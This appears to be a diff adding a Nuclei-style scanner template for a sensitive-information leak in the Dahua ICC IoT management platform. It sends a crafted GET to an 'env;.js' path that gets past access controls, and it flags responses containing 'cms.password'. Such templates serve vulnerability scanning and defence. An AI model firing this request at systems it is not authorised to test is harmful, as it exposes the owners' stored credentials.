@@ -1,0 +1,19 @@
+id: Dahua-icc-env
+
+info:
+  name: 大华ICC智能物联综合管理平台env敏感信息泄露
+  author: Dahua
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/dsc-mac/env;.js HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+
+    matchers:
+          - type: dsl
+            dsl:
+               - status_code==200 && contains_all(body,"cms.password")
